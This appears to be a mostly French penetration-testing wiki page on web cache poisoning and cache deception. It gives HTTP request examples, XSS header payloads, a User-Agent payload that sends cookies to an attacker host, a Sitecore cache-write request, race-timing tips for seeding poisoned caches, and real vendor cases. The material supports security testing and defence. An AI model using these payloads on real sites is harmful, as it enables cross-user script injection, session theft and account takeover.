# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La différence

> **Quelle est la différence entre web cache poisoning et web cache deception ?**
>
> - Dans **web cache poisoning**, l'attaquant fait en sorte que l'application stocke du contenu malveillant dans le cache, et ce contenu est servi depuis le cache à d'autres utilisateurs de l'application.
> - Dans **web cache deception**, l'attaquant provoque le stockage d'un contenu sensible appartenant à un autre utilisateur dans le cache, puis récupère ce contenu depuis le cache.

## Cache Poisoning

L'objectif du cache poisoning est de manipuler le cache côté client pour forcer les clients à charger des ressources inattendues, partielles ou sous le contrôle d'un attaquant. L'étendue de l'impact dépend de la popularité de la page affectée, car la réponse altérée est servie exclusivement aux utilisateurs visitant la page pendant la période de contamination du cache.

L'exécution d'une attaque de cache poisoning implique plusieurs étapes :

1. **Identification des paramètres non pris en compte dans la clé** : ce sont des paramètres qui, bien qu'ils ne soient pas pris en compte pour la mise en cache d'une requête, peuvent modifier la réponse renvoyée par le serveur. Les identifier est crucial car ils peuvent être exploités pour manipuler le cache.
2. **Exploitation des paramètres non pris en compte** : après les avoir identifiés, l'étape suivante consiste à déterminer comment abuser de ces paramètres pour modifier la réponse du serveur de manière avantageuse pour l'attaquant.
3. **S'assurer que la réponse empoisonnée est mise en cache** : la dernière étape est de garantir que la réponse manipulée est stockée dans le cache. Ainsi, tout utilisateur accédant à la page affectée pendant que le cache est empoisonné recevra la réponse altérée.

### Découverte : Vérifier les en-têtes HTTP

Généralement, lorsqu'une réponse a été **stockée dans le cache** il y aura un **en-tête l'indiquant**. Vous pouvez vérifier quels en-têtes vous devez surveiller dans cet article : [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Découverte : Mise en cache des codes d'erreur

Si vous pensez que la réponse est stockée dans un cache, vous pouvez essayer d'**envoyer des requêtes avec un en-tête mal formé**, qui devrait être répondu par un **code d'état 400**. Ensuite, essayez d'accéder normalement à la requête et si la **réponse renvoie un code 400**, vous savez qu'elle est vulnérable (et vous pourriez même effectuer un DoS).

Vous pouvez trouver plus d'options dans :


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Cependant, notez que **parfois ces types de codes d'état ne sont pas mis en cache**, donc ce test peut ne pas être fiable.

### Découverte : Identifier et évaluer les paramètres non pris en compte dans la clé de cache

Vous pouvez utiliser [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) pour **brute-force parameters and headers** qui peuvent **modifier la réponse de la page**. Par exemple, une page peut utiliser l'en-tête `X-Forwarded-For` pour indiquer au client de charger le script depuis là :
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Provoquer une réponse malveillante depuis le serveur back-end

Avec le paramètre/en-tête identifié, vérifiez comment il est **assaini** et **où** il est **reflété** ou affecte la réponse. Pouvez-vous l'abuser malgré tout (réaliser une XSS ou charger un code JS que vous contrôlez ? effectuer un DoS ?...)

### Obtenir la mise en cache de la réponse

Une fois que vous avez **identifié** la **page** qui peut être abusée, quel **paramètre**/**en-tête** utiliser et **comment** l'**abuser**, vous devez faire en sorte que la page soit mise en cache. Selon la ressource que vous essayez de placer en cache, cela peut prendre un certain temps ; il se peut que vous deviez réessayer pendant plusieurs secondes.

L'en-tête **`X-Cache`** dans la réponse peut être très utile car il peut avoir la valeur **`miss`** quand la requête n'a pas été mise en cache et la valeur **`hit`** quand elle est en cache.\
L'en-tête **`Cache-Control`** est aussi intéressant pour savoir si une ressource est mise en cache et quand elle sera recachée : `Cache-Control: public, max-age=1800`

Un autre en-tête intéressant est **`Vary`**. Cet en-tête est souvent utilisé pour **indiquer des en-têtes supplémentaires** qui sont traités comme **faisant partie de la clé du cache** même s'ils ne sont normalement pas pris en compte. Par conséquent, si l'attaquant connaît le `User-Agent` de la victime qu'il vise, il peut poison the cache pour les utilisateurs utilisant ce `User-Agent` spécifique.

Un autre en-tête lié au cache est **`Age`**. Il indique le temps en secondes pendant lequel l'objet est resté dans le cache du proxy.

Lors de la mise en cache d'une requête, soyez **prudent avec les en-têtes que vous utilisez** car certains d'entre eux peuvent être **pris en compte de façon inattendue** comme **faisant partie de la clé du cache**, et la **victime devra utiliser ce même en-tête**. Testez toujours un Cache Poisoning avec **différents navigateurs** pour vérifier que cela fonctionne.

## Exemples d'exploitation

### Exemple le plus simple

Un en-tête comme `X-Forwarded-For` est reflété dans la réponse sans être assaini.\
Vous pouvez envoyer un payload XSS basique et poison the cache afin que toute personne qui accède à la page soit XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Notez que cela va empoisonner une requête vers `/en?region=uk` et non vers `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning à travers les CDNs

Dans **[cet writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** est expliqué le scénario simple suivant :

- Le CDN mettra en cache tout ce qui se trouve sous `/share/`
- Le CDN NE décodera ni ne normalisera `%2F..%2F`, par conséquent, il peut être utilisé comme **path traversal to access other sensitive locations that will be cached** comme `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Le serveur web DÉCODERA et normalisera `%2F..%2F`, et répondra avec `/api/auth/session`, qui **contains the auth token**.

### Utiliser web cache poisoning pour exploiter des vulnérabilités de gestion des cookies

Les cookies peuvent aussi être reflétés dans la réponse d'une page. Si vous pouvez en abuser pour provoquer un XSS par exemple, vous pourriez exploiter le XSS dans plusieurs clients qui chargent la réponse de cache malveillante.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Notez que si le cookie vulnérable est très utilisé par les utilisateurs, des requêtes régulières nettoieront le cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Voir :


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Cet article explique**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) comment il a été possible de voler une clé API OpenAI avec une URL comme `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` parce que tout ce qui correspond à `/share/*` sera mis en cache sans que Cloudflare normalise l'URL, ce qui était fait lorsque la requête atteignait le serveur web.

Ceci est également mieux expliqué dans :


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Parfois, vous devrez **exploit several unkeyed inputs** pour pouvoir abuser d'un cache. Par exemple, vous pouvez trouver un **Open redirect** si vous définissez `X-Forwarded-Host` sur un domaine que vous contrôlez et `X-Forwarded-Scheme` sur `http`. Si le **serveur** redirige toutes les requêtes **HTTP** vers **HTTPS** et utilise l'en-tête `X-Forwarded-Scheme` comme nom de domaine pour la redirection, vous pouvez contrôler où la page est pointée par la redirection.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploiter un `Vary` header limité

Si vous constatez que l'en-tête **`X-Host`** est utilisé comme **nom de domaine pour charger une ressource JS**, mais que l'en-tête **`Vary`** dans la réponse indique **`User-Agent`**, vous devez alors trouver un moyen d'exfiltrate le `User-Agent` de la victime et de poison the cache en utilisant ce `User-Agent` :
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Envoyez une GET request avec le même contenu dans l'URL et dans le body. Si le web server utilise la valeur du body mais que le cache server met en cache celle de l'URL, toute personne accédant à cette URL utilisera en fait le paramètre provenant du body. Comme la vuln que James Kettle a trouvée sur le site Github :
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Il existe un lab PortSwigger à ce sujet : [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Par exemple, il est possible de séparer les **paramètres** dans les serveurs ruby en utilisant le caractère **`;`** au lieu de **`&`**. Cela peut être utilisé pour insérer des valeurs de paramètres sans clé à l'intérieur de paramètres à clé et les exploiter.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Apprenez ici comment effectuer [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Le [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) peut être utilisé pour tester automatiquement le web cache poisoning. Il prend en charge de nombreuses techniques et est hautement personnalisable.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Ce schéma observé en conditions réelles enchaîne une primitive de réflexion basée sur un header avec le comportement du CDN/WAF pour empoisonner de manière fiable le HTML mis en cache et servi à d'autres utilisateurs :

- Le HTML principal reflétait un header de requête non fiable (par ex., `User-Agent`) dans un contexte exécutable.
- Le CDN supprimait les headers de cache mais un cache interne/origin existait. Le CDN mettait aussi en cache automatiquement les requêtes se terminant par des extensions statiques (par ex., `.js`), tandis que le WAF appliquait une inspection de contenu plus légère aux GETs pour les ressources statiques.
- Des particularités du flux de requêtes permettaient à une requête vers un chemin `.js` d'influencer la clé/variante de cache utilisée pour le HTML principal suivant, permettant un XSS inter-utilisateurs via la réflexion d'en-tête.

Recette pratique (observée sur un CDN/WAF populaire) :

1) Depuis une IP propre (éviter les déclassements basés sur la réputation), définissez un `User-Agent` malveillant via le navigateur ou Burp Proxy Match & Replace.  
2) Dans Burp Repeater, préparez un groupe de deux requêtes et utilisez "Send group in parallel" (le mode single-packet fonctionne le mieux) :
- Première requête : GET d'un chemin de ressource `.js` sur le même origin en envoyant votre `User-Agent` malveillant.
- Immédiatement après : GET de la page principale (`/`).  
3) Cette course au routage CDN/WAF, combinée à l'auto-caching du `.js`, entraîne souvent l'ensemencement d'une variante HTML mise en cache empoisonnée qui est ensuite servie à d'autres visiteurs partageant les mêmes conditions de clé de cache (par ex., mêmes dimensions `Vary` comme `User-Agent`).

Exemple de charge utile d'en-tête (pour exfiltrer des cookies non-HttpOnly) :
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.

Defenses:

- Stop reflecting request headers into HTML; strictly context-encode if unavoidable. Align CDN and origin cache policies and avoid varying on untrusted headers.
- Ensure WAF applies content inspection consistently to `.js` requests and static paths.
- Set `HttpOnly` (and `Secure`, `SameSite`) on session cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Un pattern spécifique à Sitecore permet des écritures non authentifiées dans le HtmlCache en abusant de pre‑auth XAML handlers et de AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Cela écrit du HTML arbitraire sous un attacker‑chosen cache key, permettant un empoisonnement précis une fois les cache keys connues.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Exemples vulnérables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS a transmis le fragment présent dans l'URL sans le supprimer et générait la cache key en n'utilisant que le host, path et query (ignorant le fragment). Ainsi la requête `/#/../?r=javascript:alert(1)` était envoyée au backend comme `/#/../?r=javascript:alert(1)` et la cache key n'incluait pas le payload, seulement host, path et query.

### GitHub CP-DoS

Envoyer une valeur invalide dans le header content-type déclenchait une réponse 405 mise en cache. La cache key contenait le cookie, il était donc possible seulement d'attaquer des unauth users.

### GitLab + GCP CP-DoS

GitLab utilise des GCP buckets pour stocker du contenu statique. **GCP Buckets** supportent le **header `x-http-method-override`**. Il était donc possible d'envoyer le header `x-http-method-override: HEAD` et d'empoisonner le cache pour retourner un corps de réponse vide. Il pouvait aussi supporter la méthode `PURGE`.

### Rack Middleware (Ruby on Rails)

Dans les applications Ruby on Rails, le middleware Rack est souvent utilisé. Le rôle du code Rack est de prendre la valeur du header **`x-forwarded-scheme`** et de la définir comme le scheme de la requête. Quand le header `x-forwarded-scheme: http` est envoyé, un redirect 301 vers la même location se produit, ce qui peut provoquer un Denial of Service (DoS) sur cette ressource. De plus, l'application peut prendre en compte le header `X-forwarded-host` et rediriger les utilisateurs vers l'hôte spécifié. Ce comportement peut conduire au chargement de fichiers JavaScript depuis le serveur d'un attacker, posant un risque de sécurité.

### 403 and Storage Buckets

Cloudflare mettait auparavant en cache les réponses 403. Tenter d'accéder à S3 ou Azure Storage Blobs avec des headers Authorization incorrects renvoyait une réponse 403 qui était mise en cache. Bien que Cloudflare ait arrêté de mettre en cache les 403, ce comportement peut encore être présent chez d'autres services proxy.

### Injecting Keyed Parameters

Les caches incluent souvent des paramètres GET spécifiques dans la cache key. Par exemple, le Varnish de Fastly mettait en cache le paramètre `size` dans les requêtes. Cependant, si une version encodée de l'URL du paramètre (par ex. `siz%65`) était aussi envoyée avec une valeur erronée, la cache key serait construite en utilisant le paramètre `size` correct. Pourtant, le backend traiterait la valeur dans le paramètre encodé. Encoder en URL le second paramètre `size` faisait qu'il était omis par le cache mais utilisé par le backend. Attribuer la valeur 0 à ce paramètre aboutissait à une erreur 400 Bad Request mise en cache.

### User Agent Rules

Certains développeurs bloquent les requêtes avec des user-agents correspondant à des outils à fort trafic comme FFUF ou Nuclei pour gérer la charge serveur. Ironiquement, cette approche peut introduire des vulnérabilités telles que cache poisoning et DoS.

### Illegal Header Fields

Le [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) spécifie les caractères acceptables dans les noms de headers. Les headers contenant des caractères en dehors de la plage **tchar** devraient idéalement déclencher une 400 Bad Request. En pratique, les serveurs n'adhèrent pas toujours à cette norme. Un exemple notable est Akamai, qui forwarde des headers avec des caractères invalides et met en cache toute erreur 400, tant que le header `cache-control` n'est pas présent. Un pattern exploitable a été identifié où l'envoi d'un header avec un caractère illégal, comme `\`, résultait en une 400 Bad Request mise en cache.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type.

Apprenez ici comment effectuer[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Outils Automatiques

- [**toxicache**](https://github.com/xhzeem/toxicache): scanner Golang pour trouver des web cache poisoning vulnerabilities dans une liste d'URLs et tester plusieurs techniques d'injection.

## Références

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
